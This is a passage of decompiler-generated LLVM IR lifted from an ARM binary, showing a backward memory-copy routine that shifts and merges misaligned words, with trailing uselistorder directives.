  store i32 %v2_172f8, i32* %r2.global-to-local, align 4
  %v4_172f8 = xor i32 %v1_172f8, %v0_172f8
  %v5_172f8 = xor i32 %v2_172f8, %v0_172f8
  %v6_172f8 = and i32 %v5_172f8, %v4_172f8
  %v7_172f8 = icmp slt i32 %v6_172f8, 0
  store i1 %v7_172f8, i1* %cpsr_v.global-to-local, align 1
  %v8_172f8 = icmp slt i32 %v2_172f8, 0
  store i1 %v8_172f8, i1* %cpsr_n.global-to-local, align 1
  %v9_172f8 = icmp eq i32 %v0_172f8, %v1_172f8
  store i1 %v9_172f8, i1* %cpsr_z.global-to-local, align 1
  %v5_172fc = icmp slt i32 %v0_172f8, %v1_172f8
  br i1 %v5_172fc, label %bb150, label %dec_label_pc_17300

dec_label_pc_17300:                               ; preds = %.thread14
  %v0_17300 = load i32, i32* %r1.global-to-local, align 4
  %v1_17300 = urem i32 %v0_17300, 4
  store i32 %v1_17300, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_17300 = icmp eq i32 %v1_17300, 0
  store i1 %v2_17300, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17300, label %dec_label_pc_17244, label %dec_label_pc_17308

dec_label_pc_17308:                               ; preds = %dec_label_pc_1723c, %dec_label_pc_17300
  %v0_1735019 = phi i32 [ %v2_17228, %dec_label_pc_1723c ], [ %v0_1735020, %dec_label_pc_17300 ]
  %v0_173fc = phi i32 [ %v2_1722c, %dec_label_pc_1723c ], [ %v2_172f8, %dec_label_pc_17300 ]
  %v0_17308 = phi i32 [ %v2_17224, %dec_label_pc_1723c ], [ %v0_17300, %dec_label_pc_17300 ]
  %v0_17310 = phi i32 [ %v1_1723c, %dec_label_pc_1723c ], [ %v1_17300, %dec_label_pc_17300 ]
  %v1_17308 = and i32 %v0_17308, -4
  store i32 %v1_17308, i32* %r1.global-to-local, align 4
  %v1_1730c = inttoptr i32 %v1_17308 to i32*
  %v2_1730c = load i32, i32* %v1_1730c, align 4
  store i32 %v2_1730c, i32* @r3, align 4
  %v7_17310 = icmp ult i32 %v0_17310, 2
  %v2_173f4 = add i32 %v0_173fc, -12
  %v4_173f4 = sub i32 11, %v0_173fc
  %v5_173f4 = and i32 %v4_173f4, %v0_173fc
  %v6_173f4 = icmp slt i32 %v5_173f4, 0
  store i1 %v6_173f4, i1* %cpsr_v.global-to-local, align 1
  %v7_173f4 = icmp slt i32 %v2_173f4, 0
  store i1 %v7_173f4, i1* %cpsr_n.global-to-local, align 1
  %v8_173f4 = icmp eq i32 %v0_173fc, 12
  store i1 %v8_173f4, i1* %cpsr_z.global-to-local, align 1
  %v5_173f8 = icmp slt i32 %v0_173fc, 12
  br i1 %v7_17310, label %dec_label_pc_173f4, label %dec_label_pc_17318

dec_label_pc_17318:                               ; preds = %dec_label_pc_17308
  %v8_17310 = icmp eq i32 %v0_17310, 2
  br i1 %v8_17310, label %dec_label_pc_17388, label %dec_label_pc_1731c

dec_label_pc_1731c:                               ; preds = %dec_label_pc_17318
  br i1 %v5_173f8, label %dec_label_pc_17368, label %dec_label_pc_17324

dec_label_pc_17324:                               ; preds = %dec_label_pc_1731c
  store i32 %v2_173f4, i32* %r2.global-to-local, align 4
  %v3_17328 = load i32, i32* @r4, align 4
  store i32 %v3_17328, i32* %stack_var_-12, align 4
  %v6_17328 = load i32, i32* @r5, align 4
  %v8_17328 = inttoptr i32 %v6_17328 to i8*
  store i8* %v8_17328, i8** %stack_var_-8, align 4
  %v11_17328 = load i32, i32* @lr, align 4
  br label %dec_label_pc_1732c

dec_label_pc_1732c:                               ; preds = %dec_label_pc_1732c.dec_label_pc_1732c_crit_edge, %dec_label_pc_17324
  %v0_17350 = phi i32 [ %v1_17350, %dec_label_pc_1732c.dec_label_pc_1732c_crit_edge ], [ %v0_1735019, %dec_label_pc_17324 ]
  %v0_17330 = phi i32 [ %v0_17330.pre, %dec_label_pc_1732c.dec_label_pc_1732c_crit_edge ], [ %v1_17308, %dec_label_pc_17324 ]
  %v0_1732c = phi i32 [ %v0_1732c.pre, %dec_label_pc_1732c.dec_label_pc_1732c_crit_edge ], [ %v2_1730c, %dec_label_pc_17324 ]
  %v3_1732c = mul i32 %v0_1732c, 256
  store i32 %v3_1732c, i32* %lr.global-to-local, align 4
  %v1_17330 = add i32 %v0_17330, -4
  %v2_17330 = inttoptr i32 %v1_17330 to i32*
  %v3_17330 = load i32, i32* %v2_17330, align 4
  store i32 %v3_17330, i32* @r3, align 4
  %v4_17330 = add i32 %v0_17330, -8
  %v5_17330 = inttoptr i32 %v4_17330 to i32*
  %v6_17330 = load i32, i32* %v5_17330, align 4
  store i32 %v6_17330, i32* %r4.global-to-local, align 4
  %v7_17330 = add i32 %v0_17330, -12
  %v8_17330 = inttoptr i32 %v7_17330 to i32*
  %v9_17330 = load i32, i32* %v8_17330, align 4
  store i32 %v9_17330, i32* %r5.global-to-local, align 4
  %v10_17330 = add i32 %v0_17330, -16
  %v11_17330 = inttoptr i32 %v10_17330 to i32*
  %v12_17330 = load i32, i32* %v11_17330, align 4
  store i32 %v10_17330, i32* %r1.global-to-local, align 4
  %v4_17334 = udiv i32 %v12_17330, 16777216
  %v5_17334 = or i32 %v4_17334, %v3_1732c
  store i32 %v5_17334, i32* %lr.global-to-local, align 4
  %v3_17338 = mul i32 %v12_17330, 256
  %v4_1733c = udiv i32 %v9_17330, 16777216
  %v5_1733c = or i32 %v3_17338, %v4_1733c
  store i32 %v5_1733c, i32* @ip, align 4
  %v3_17340 = mul i32 %v9_17330, 256
  %v4_17344 = udiv i32 %v6_17330, 16777216
  %v5_17344 = or i32 %v3_17340, %v4_17344
  store i32 %v5_17344, i32* %r5.global-to-local, align 4
  %v3_17348 = mul i32 %v6_17330, 256
  %v4_1734c = udiv i32 %v3_17330, 16777216
  %v5_1734c = or i32 %v3_17348, %v4_1734c
  store i32 %v5_1734c, i32* %r4.global-to-local, align 4
  %v1_17350 = add i32 %v0_17350, -16
  %v2_17350 = inttoptr i32 %v1_17350 to i32*
  store i32 %v5_1734c, i32* %v2_17350, align 4
  %v4_17350 = add i32 %v0_17350, -12
  %v5_17350 = inttoptr i32 %v4_17350 to i32*
  %v6_17350 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_17350, i32* %v5_17350, align 4
  %v7_17350 = add i32 %v0_17350, -8
  %v8_17350 = inttoptr i32 %v7_17350 to i32*
  %v9_17350 = load i32, i32* @ip, align 4
  store i32 %v9_17350, i32* %v8_17350, align 4
  %v10_17350 = add i32 %v0_17350, -4
  %v11_17350 = inttoptr i32 %v10_17350 to i32*
  %v12_17350 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_17350, i32* %v11_17350, align 4
  store i32 %v1_17350, i32* %r0.global-to-local, align 4
  %v0_17354 = load i32, i32* %r2.global-to-local, align 4
  %v2_17354 = add i32 %v0_17354, -16
  store i32 %v2_17354, i32* %r2.global-to-local, align 4
  %v6_17358 = icmp slt i32 %v0_17354, 16
  br i1 %v6_17358, label %dec_label_pc_1735c, label %dec_label_pc_1732c.dec_label_pc_1732c_crit_edge

dec_label_pc_1732c.dec_label_pc_1732c_crit_edge:  ; preds = %dec_label_pc_1732c
  %v0_1732c.pre = load i32, i32* @r3, align 4
  %v0_17330.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1732c

dec_label_pc_1735c:                               ; preds = %dec_label_pc_1732c
  %v2_1735c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1735c, i32* @r4, align 4
  %v5_1735c = load i8*, i8** %stack_var_-8, align 4
  %v6_1735c = ptrtoint i8* %v5_1735c to i32
  store i32 %v6_1735c, i32* @r5, align 4
  store i32 %v11_17328, i32* @lr, align 4
  %v2_17360 = add i32 %v0_17354, -4
  store i32 %v2_17360, i32* %r2.global-to-local, align 4
  %v4_17360 = add i32 %v0_17354, 2147483632
  %v5_17360 = and i32 %v2_17360, %v4_17360
  %v6_17360 = icmp slt i32 %v5_17360, 0
  store i1 %v6_17360, i1* %cpsr_v.global-to-local, align 1
  %v7_17360 = icmp slt i32 %v2_17360, 0
  store i1 %v7_17360, i1* %cpsr_n.global-to-local, align 1
  %v8_17360 = icmp eq i32 %v2_17360, 0
  store i1 %v8_17360, i1* %cpsr_z.global-to-local, align 1
  %v5_17364 = icmp slt i32 %v2_17354, -12
  br i1 %v5_17364, label %dec_label_pc_17380, label %dec_label_pc_17368

dec_label_pc_17368:                               ; preds = %dec_label_pc_1735c, %dec_label_pc_1731c, %dec_label_pc_17368
  %v1_17374 = phi i32 [ %v5_17374, %dec_label_pc_17368 ], [ %v1_17350, %dec_label_pc_1735c ], [ %v0_1735019, %dec_label_pc_1731c ]
  %v0_17368 = load i32, i32* @r3, align 4
  %v3_17368 = mul i32 %v0_17368, 256
  store i32 %v3_17368, i32* %ip.global-to-local, align 4
  %v0_1736c = load i32, i32* %r1.global-to-local, align 4
  %v1_1736c = add i32 %v0_1736c, -4
  %v2_1736c = inttoptr i32 %v1_1736c to i32*
  %v3_1736c = load i32, i32* %v2_1736c, align 4
  store i32 %v3_1736c, i32* @r3, align 4
  store i32 %v1_1736c, i32* %r1.global-to-local, align 4
  %v4_17370 = udiv i32 %v3_1736c, 16777216
  %v5_17370 = or i32 %v4_17370, %v3_17368
  store i32 %v5_17370, i32* @ip, align 4
  %v2_17374 = add i32 %v1_17374, -4
  %v3_17374 = inttoptr i32 %v2_17374 to i32*
  store i32 %v5_17370, i32* %v3_17374, align 4
  %v4_17374 = load i32, i32* %r0.global-to-local, align 4
  %v5_17374 = add i32 %v4_17374, -4
  store i32 %v5_17374, i32* %r0.global-to-local, align 4
  %v0_17378 = load i32, i32* %r2.global-to-local, align 4
  %v2_17378 = add i32 %v0_17378, -4
  store i32 %v2_17378, i32* %r2.global-to-local, align 4
  %v6_1737c = icmp slt i32 %v0_17378, 4
  br i1 %v6_1737c, label %dec_label_pc_17380.loopexit, label %dec_label_pc_17368

dec_label_pc_17380.loopexit:                      ; preds = %dec_label_pc_17368
  %v4_17378 = sub i32 3, %v0_17378
  %v5_17378 = and i32 %v4_17378, %v0_17378
  %v6_17378 = icmp slt i32 %v5_17378, 0
  %v7_17378 = icmp slt i32 %v2_17378, 0
  store i1 %v6_17378, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_17378, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_17380

dec_label_pc_17380:                               ; preds = %dec_label_pc_17380.loopexit, %dec_label_pc_1735c
  %v2_172c451 = phi i32 [ %v5_17374, %dec_label_pc_17380.loopexit ], [ %v1_17350, %dec_label_pc_1735c ]
  %v0_172b447 = phi i32 [ %v2_17378, %dec_label_pc_17380.loopexit ], [ %v2_17360, %dec_label_pc_1735c ]
  %v0_17380 = load i32, i32* %r1.global-to-local, align 4
  %v1_17380 = add i32 %v0_17380, 3
  store i32 %v1_17380, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_17388:                               ; preds = %dec_label_pc_17318
  br i1 %v5_173f8, label %dec_label_pc_173d4, label %dec_label_pc_17390

dec_label_pc_17390:                               ; preds = %dec_label_pc_17388
  store i32 %v2_173f4, i32* %r2.global-to-local, align 4
  %v3_17394 = load i32, i32* @r4, align 4
  store i32 %v3_17394, i32* %stack_var_-12, align 4
  %v6_17394 = load i32, i32* @r5, align 4
  %v8_17394 = inttoptr i32 %v6_17394 to i8*
  store i8* %v8_17394, i8** %stack_var_-8, align 4
  %v11_17394 = load i32, i32* @lr, align 4
  br label %dec_label_pc_17398

dec_label_pc_17398:                               ; preds = %dec_label_pc_17398.dec_label_pc_17398_crit_edge, %dec_label_pc_17390
  %v0_173bc = phi i32 [ %v1_173bc, %dec_label_pc_17398.dec_label_pc_17398_crit_edge ], [ %v0_1735019, %dec_label_pc_17390 ]
  %v0_1739c = phi i32 [ %v0_1739c.pre, %dec_label_pc_17398.dec_label_pc_17398_crit_edge ], [ %v1_17308, %dec_label_pc_17390 ]
  %v0_17398 = phi i32 [ %v0_17398.pre, %dec_label_pc_17398.dec_label_pc_17398_crit_edge ], [ %v2_1730c, %dec_label_pc_17390 ]
  %v3_17398 = mul i32 %v0_17398, 65536
  store i32 %v3_17398, i32* %lr.global-to-local, align 4
  %v1_1739c = add i32 %v0_1739c, -4
  %v2_1739c = inttoptr i32 %v1_1739c to i32*
  %v3_1739c = load i32, i32* %v2_1739c, align 4
  store i32 %v3_1739c, i32* @r3, align 4
  %v4_1739c = add i32 %v0_1739c, -8
  %v5_1739c = inttoptr i32 %v4_1739c to i32*
  %v6_1739c = load i32, i32* %v5_1739c, align 4
  store i32 %v6_1739c, i32* %r4.global-to-local, align 4
  %v7_1739c = add i32 %v0_1739c, -12
  %v8_1739c = inttoptr i32 %v7_1739c to i32*
  %v9_1739c = load i32, i32* %v8_1739c, align 4
  store i32 %v9_1739c, i32* %r5.global-to-local, align 4
  %v10_1739c = add i32 %v0_1739c, -16
  %v11_1739c = inttoptr i32 %v10_1739c to i32*
  %v12_1739c = load i32, i32* %v11_1739c, align 4
  store i32 %v10_1739c, i32* %r1.global-to-local, align 4
  %v4_173a0 = udiv i32 %v12_1739c, 65536
  %v5_173a0 = or i32 %v4_173a0, %v3_17398
  store i32 %v5_173a0, i32* %lr.global-to-local, align 4
  %v3_173a4 = mul i32 %v12_1739c, 65536
  %v4_173a8 = udiv i32 %v9_1739c, 65536
  %v5_173a8 = or i32 %v3_173a4, %v4_173a8
  store i32 %v5_173a8, i32* @ip, align 4
  %v3_173ac = mul i32 %v9_1739c, 65536
  %v4_173b0 = udiv i32 %v6_1739c, 65536
  %v5_173b0 = or i32 %v3_173ac, %v4_173b0
  store i32 %v5_173b0, i32* %r5.global-to-local, align 4
  %v3_173b4 = mul i32 %v6_1739c, 65536
  %v4_173b8 = udiv i32 %v3_1739c, 65536
  %v5_173b8 = or i32 %v3_173b4, %v4_173b8
  store i32 %v5_173b8, i32* %r4.global-to-local, align 4
  %v1_173bc = add i32 %v0_173bc, -16
  %v2_173bc = inttoptr i32 %v1_173bc to i32*
  store i32 %v5_173b8, i32* %v2_173bc, align 4
  %v4_173bc = add i32 %v0_173bc, -12
  %v5_173bc = inttoptr i32 %v4_173bc to i32*
  %v6_173bc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_173bc, i32* %v5_173bc, align 4
  %v7_173bc = add i32 %v0_173bc, -8
  %v8_173bc = inttoptr i32 %v7_173bc to i32*
  %v9_173bc = load i32, i32* @ip, align 4
  store i32 %v9_173bc, i32* %v8_173bc, align 4
  %v10_173bc = add i32 %v0_173bc, -4
  %v11_173bc = inttoptr i32 %v10_173bc to i32*
  %v12_173bc = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_173bc, i32* %v11_173bc, align 4
  store i32 %v1_173bc, i32* %r0.global-to-local, align 4
  %v0_173c0 = load i32, i32* %r2.global-to-local, align 4
  %v2_173c0 = add i32 %v0_173c0, -16
  store i32 %v2_173c0, i32* %r2.global-to-local, align 4
  %v6_173c4 = icmp slt i32 %v0_173c0, 16
  br i1 %v6_173c4, label %dec_label_pc_173c8, label %dec_label_pc_17398.dec_label_pc_17398_crit_edge

dec_label_pc_17398.dec_label_pc_17398_crit_edge:  ; preds = %dec_label_pc_17398
  %v0_17398.pre = load i32, i32* @r3, align 4
  %v0_1739c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17398

dec_label_pc_173c8:                               ; preds = %dec_label_pc_17398
  %v2_173c8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_173c8, i32* @r4, align 4
  %v5_173c8 = load i8*, i8** %stack_var_-8, align 4
  %v6_173c8 = ptrtoint i8* %v5_173c8 to i32
  store i32 %v6_173c8, i32* @r5, align 4
  store i32 %v11_17394, i32* @lr, align 4
  %v2_173cc = add i32 %v0_173c0, -4
  store i32 %v2_173cc, i32* %r2.global-to-local, align 4
  %v4_173cc = add i32 %v0_173c0, 2147483632
  %v5_173cc = and i32 %v2_173cc, %v4_173cc
  %v6_173cc = icmp slt i32 %v5_173cc, 0
  store i1 %v6_173cc, i1* %cpsr_v.global-to-local, align 1
  %v7_173cc = icmp slt i32 %v2_173cc, 0
  store i1 %v7_173cc, i1* %cpsr_n.global-to-local, align 1
  %v8_173cc = icmp eq i32 %v2_173cc, 0
  store i1 %v8_173cc, i1* %cpsr_z.global-to-local, align 1
  %v5_173d0 = icmp slt i32 %v2_173c0, -12
  br i1 %v5_173d0, label %dec_label_pc_173ec, label %dec_label_pc_173d4

dec_label_pc_173d4:                               ; preds = %dec_label_pc_173c8, %dec_label_pc_17388, %dec_label_pc_173d4
  %v1_173e0 = phi i32 [ %v5_173e0, %dec_label_pc_173d4 ], [ %v1_173bc, %dec_label_pc_173c8 ], [ %v0_1735019, %dec_label_pc_17388 ]
  %v0_173d4 = load i32, i32* @r3, align 4
  %v3_173d4 = mul i32 %v0_173d4, 65536
  store i32 %v3_173d4, i32* %ip.global-to-local, align 4
  %v0_173d8 = load i32, i32* %r1.global-to-local, align 4
  %v1_173d8 = add i32 %v0_173d8, -4
  %v2_173d8 = inttoptr i32 %v1_173d8 to i32*
  %v3_173d8 = load i32, i32* %v2_173d8, align 4
  store i32 %v3_173d8, i32* @r3, align 4
  store i32 %v1_173d8, i32* %r1.global-to-local, align 4
  %v4_173dc = udiv i32 %v3_173d8, 65536
  %v5_173dc = or i32 %v4_173dc, %v3_173d4
  store i32 %v5_173dc, i32* @ip, align 4
  %v2_173e0 = add i32 %v1_173e0, -4
  %v3_173e0 = inttoptr i32 %v2_173e0 to i32*
  store i32 %v5_173dc, i32* %v3_173e0, align 4
  %v4_173e0 = load i32, i32* %r0.global-to-local, align 4
  %v5_173e0 = add i32 %v4_173e0, -4
  store i32 %v5_173e0, i32* %r0.global-to-local, align 4
  %v0_173e4 = load i32, i32* %r2.global-to-local, align 4
  %v2_173e4 = add i32 %v0_173e4, -4
  store i32 %v2_173e4, i32* %r2.global-to-local, align 4
  %v6_173e8 = icmp slt i32 %v0_173e4, 4
  br i1 %v6_173e8, label %dec_label_pc_173ec.loopexit, label %dec_label_pc_173d4

dec_label_pc_173ec.loopexit:                      ; preds = %dec_label_pc_173d4
  %v4_173e4 = sub i32 3, %v0_173e4
  %v5_173e4 = and i32 %v4_173e4, %v0_173e4
  %v6_173e4 = icmp slt i32 %v5_173e4, 0
  %v7_173e4 = icmp slt i32 %v2_173e4, 0
  store i1 %v6_173e4, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_173e4, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_173ec

dec_label_pc_173ec:                               ; preds = %dec_label_pc_173ec.loopexit, %dec_label_pc_173c8
  %v2_172c452 = phi i32 [ %v5_173e0, %dec_label_pc_173ec.loopexit ], [ %v1_173bc, %dec_label_pc_173c8 ]
  %v0_172b448 = phi i32 [ %v2_173e4, %dec_label_pc_173ec.loopexit ], [ %v2_173cc, %dec_label_pc_173c8 ]
  %v0_173ec = load i32, i32* %r1.global-to-local, align 4
  %v1_173ec = add i32 %v0_173ec, 2
  store i32 %v1_173ec, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_173f4:                               ; preds = %dec_label_pc_17308
  br i1 %v5_173f8, label %dec_label_pc_17440, label %dec_label_pc_173fc

dec_label_pc_173fc:                               ; preds = %dec_label_pc_173f4
  store i32 %v2_173f4, i32* %r2.global-to-local, align 4
  %v3_17400 = load i32, i32* @r4, align 4
  store i32 %v3_17400, i32* %stack_var_-12, align 4
  %v6_17400 = load i32, i32* @r5, align 4
  %v8_17400 = inttoptr i32 %v6_17400 to i8*
  store i8* %v8_17400, i8** %stack_var_-8, align 4
  %v11_17400 = load i32, i32* @lr, align 4
  br label %dec_label_pc_17404

dec_label_pc_17404:                               ; preds = %dec_label_pc_17404.dec_label_pc_17404_crit_edge, %dec_label_pc_173fc
  %v0_17428 = phi i32 [ %v1_17428, %dec_label_pc_17404.dec_label_pc_17404_crit_edge ], [ %v0_1735019, %dec_label_pc_173fc ]
  %v0_17408 = phi i32 [ %v0_17408.pre, %dec_label_pc_17404.dec_label_pc_17404_crit_edge ], [ %v1_17308, %dec_label_pc_173fc ]
  %v0_17404 = phi i32 [ %v0_17404.pre, %dec_label_pc_17404.dec_label_pc_17404_crit_edge ], [ %v2_1730c, %dec_label_pc_173fc ]
  %v3_17404 = mul i32 %v0_17404, 16777216
  store i32 %v3_17404, i32* %lr.global-to-local, align 4
  %v1_17408 = add i32 %v0_17408, -4
  %v2_17408 = inttoptr i32 %v1_17408 to i32*
  %v3_17408 = load i32, i32* %v2_17408, align 4
  store i32 %v3_17408, i32* @r3, align 4
  %v4_17408 = add i32 %v0_17408, -8
  %v5_17408 = inttoptr i32 %v4_17408 to i32*
  %v6_17408 = load i32, i32* %v5_17408, align 4
  store i32 %v6_17408, i32* %r4.global-to-local, align 4
  %v7_17408 = add i32 %v0_17408, -12
  %v8_17408 = inttoptr i32 %v7_17408 to i32*
  %v9_17408 = load i32, i32* %v8_17408, align 4
  store i32 %v9_17408, i32* %r5.global-to-local, align 4
  %v10_17408 = add i32 %v0_17408, -16
  %v11_17408 = inttoptr i32 %v10_17408 to i32*
  %v12_17408 = load i32, i32* %v11_17408, align 4
  store i32 %v10_17408, i32* %r1.global-to-local, align 4
  %v4_1740c = udiv i32 %v12_17408, 256
  %v5_1740c = or i32 %v4_1740c, %v3_17404
  store i32 %v5_1740c, i32* %lr.global-to-local, align 4
  %v3_17410 = mul i32 %v12_17408, 16777216
  %v4_17414 = udiv i32 %v9_17408, 256
  %v5_17414 = or i32 %v3_17410, %v4_17414
  store i32 %v5_17414, i32* @ip, align 4
  %v3_17418 = mul i32 %v9_17408, 16777216
  %v4_1741c = udiv i32 %v6_17408, 256
  %v5_1741c = or i32 %v3_17418, %v4_1741c
  store i32 %v5_1741c, i32* %r5.global-to-local, align 4
  %v3_17420 = mul i32 %v6_17408, 16777216
  %v4_17424 = udiv i32 %v3_17408, 256
  %v5_17424 = or i32 %v3_17420, %v4_17424
  store i32 %v5_17424, i32* %r4.global-to-local, align 4
  %v1_17428 = add i32 %v0_17428, -16
  %v2_17428 = inttoptr i32 %v1_17428 to i32*
  store i32 %v5_17424, i32* %v2_17428, align 4
  %v4_17428 = add i32 %v0_17428, -12
  %v5_17428 = inttoptr i32 %v4_17428 to i32*
  %v6_17428 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_17428, i32* %v5_17428, align 4
  %v7_17428 = add i32 %v0_17428, -8
  %v8_17428 = inttoptr i32 %v7_17428 to i32*
  %v9_17428 = load i32, i32* @ip, align 4
  store i32 %v9_17428, i32* %v8_17428, align 4
  %v10_17428 = add i32 %v0_17428, -4
  %v11_17428 = inttoptr i32 %v10_17428 to i32*
  %v12_17428 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_17428, i32* %v11_17428, align 4
  store i32 %v1_17428, i32* %r0.global-to-local, align 4
  %v0_1742c = load i32, i32* %r2.global-to-local, align 4
  %v2_1742c = add i32 %v0_1742c, -16
  store i32 %v2_1742c, i32* %r2.global-to-local, align 4
  %v6_17430 = icmp slt i32 %v0_1742c, 16
  br i1 %v6_17430, label %dec_label_pc_17434, label %dec_label_pc_17404.dec_label_pc_17404_crit_edge

dec_label_pc_17404.dec_label_pc_17404_crit_edge:  ; preds = %dec_label_pc_17404
  %v0_17404.pre = load i32, i32* @r3, align 4
  %v0_17408.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17404

dec_label_pc_17434:                               ; preds = %dec_label_pc_17404
  %v2_17434 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17434, i32* @r4, align 4
  %v5_17434 = load i8*, i8** %stack_var_-8, align 4
  %v6_17434 = ptrtoint i8* %v5_17434 to i32
  store i32 %v6_17434, i32* @r5, align 4
  store i32 %v11_17400, i32* @lr, align 4
  %v2_17438 = add i32 %v0_1742c, -4
  store i32 %v2_17438, i32* %r2.global-to-local, align 4
  %v4_17438 = add i32 %v0_1742c, 2147483632
  %v5_17438 = and i32 %v2_17438, %v4_17438
  %v6_17438 = icmp slt i32 %v5_17438, 0
  store i1 %v6_17438, i1* %cpsr_v.global-to-local, align 1
  %v7_17438 = icmp slt i32 %v2_17438, 0
  store i1 %v7_17438, i1* %cpsr_n.global-to-local, align 1
  %v8_17438 = icmp eq i32 %v2_17438, 0
  store i1 %v8_17438, i1* %cpsr_z.global-to-local, align 1
  %v5_1743c = icmp slt i32 %v2_1742c, -12
  br i1 %v5_1743c, label %dec_label_pc_17458, label %dec_label_pc_17440

dec_label_pc_17440:                               ; preds = %dec_label_pc_17434, %dec_label_pc_173f4, %dec_label_pc_17440
  %v1_1744c = phi i32 [ %v5_1744c, %dec_label_pc_17440 ], [ %v1_17428, %dec_label_pc_17434 ], [ %v0_1735019, %dec_label_pc_173f4 ]
  %v0_17440 = load i32, i32* @r3, align 4
  %v3_17440 = mul i32 %v0_17440, 16777216
  store i32 %v3_17440, i32* %ip.global-to-local, align 4
  %v0_17444 = load i32, i32* %r1.global-to-local, align 4
  %v1_17444 = add i32 %v0_17444, -4
  %v2_17444 = inttoptr i32 %v1_17444 to i32*
  %v3_17444 = load i32, i32* %v2_17444, align 4
  store i32 %v3_17444, i32* @r3, align 4
  store i32 %v1_17444, i32* %r1.global-to-local, align 4
  %v4_17448 = udiv i32 %v3_17444, 256
  %v5_17448 = or i32 %v4_17448, %v3_17440
  store i32 %v5_17448, i32* @ip, align 4
  %v2_1744c = add i32 %v1_1744c, -4
  %v3_1744c = inttoptr i32 %v2_1744c to i32*
  store i32 %v5_17448, i32* %v3_1744c, align 4
  %v4_1744c = load i32, i32* %r0.global-to-local, align 4
  %v5_1744c = add i32 %v4_1744c, -4
  store i32 %v5_1744c, i32* %r0.global-to-local, align 4
  %v0_17450 = load i32, i32* %r2.global-to-local, align 4
  %v2_17450 = add i32 %v0_17450, -4
  store i32 %v2_17450, i32* %r2.global-to-local, align 4
  %v6_17454 = icmp slt i32 %v0_17450, 4
  br i1 %v6_17454, label %dec_label_pc_17458.loopexit, label %dec_label_pc_17440

dec_label_pc_17458.loopexit:                      ; preds = %dec_label_pc_17440
  %v4_17450 = sub i32 3, %v0_17450
  %v5_17450 = and i32 %v4_17450, %v0_17450
  %v6_17450 = icmp slt i32 %v5_17450, 0
  %v7_17450 = icmp slt i32 %v2_17450, 0
  store i1 %v6_17450, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_17450, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_17458

dec_label_pc_17458:                               ; preds = %dec_label_pc_17458.loopexit, %dec_label_pc_17434
  %v2_172c453 = phi i32 [ %v5_1744c, %dec_label_pc_17458.loopexit ], [ %v1_17428, %dec_label_pc_17434 ]
  %v0_172b449 = phi i32 [ %v2_17450, %dec_label_pc_17458.loopexit ], [ %v2_17438, %dec_label_pc_17434 ]
  %v0_17458 = load i32, i32* %r1.global-to-local, align 4
  %v1_17458 = add i32 %v0_17458, 1
  store i32 %v1_17458, i32* %r1.global-to-local, align 4
  br label %bb150

; uselistorder directives
  uselistorder i32 %v5_1744c, { 0, 2, 1 }
  uselistorder i32 %v3_17440, { 1, 0 }
  uselistorder i32 %v2_17438, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_17428, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_17408, { 1, 0 }
  uselistorder i32 %v3_17404, { 1, 0 }
  uselistorder i32 %v0_17408, { 3, 2, 1, 0 }
  uselistorder i32 %v0_17428, { 3, 2, 1, 0 }
  uselistorder i32 %v5_173e0, { 0, 2, 1 }
  uselistorder i32 %v3_173d4, { 1, 0 }
  uselistorder i32 %v2_173cc, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_173bc, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_1739c, { 1, 0 }
  uselistorder i32 %v3_17398, { 1, 0 }
  uselistorder i32 %v0_1739c, { 3, 2, 1, 0 }
  uselistorder i32 %v0_173bc, { 3, 2, 1, 0 }
  uselistorder i32 %v5_17374, { 0, 2, 1 }
  uselistorder i32 %v3_17368, { 1, 0 }
  uselistorder i32 %v2_17360, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_17350, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_17330, { 1, 0 }
  uselistorder i32 %v3_1732c, { 1, 0 }
  uselistorder i32 %v0_17330, { 3, 2, 1, 0 }
  uselistorder i32 %v0_17350, { 3, 2, 1, 0 }
  uselistorder i1 %v5_173f8, { 2, 0, 1 }
  uselistorder i32 %v0_17310, { 1, 0 }
  uselistorder i32 %v0_173fc, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_1735019, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_17300, { 2, 1, 0 }
  uselistorder i32 %v0_17300, { 2, 0, 1 }
  uselistorder i32 %v2_172f8, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_172f8, { 1, 2, 0, 3 }
  uselistorder i32 %v0_172f8, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_1735020, { 2, 1, 0 }
  uselistorder i32 %v11_172d4, { 1, 0 }
  uselistorder i32 %v7_172d4, { 1, 0 }
  uselistorder i32 %v1_172b4, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_172b4, { 1, 2, 0, 3 }
  uselistorder i32 %v2_172b8, { 1, 0 }
  uselistorder i32 %v7_172ac, { 0, 2, 1 }
  uselistorder i32 %v10_172a8, { 1, 0 }
  uselistorder i32 %v9_172a0, { 1, 0, 2 }
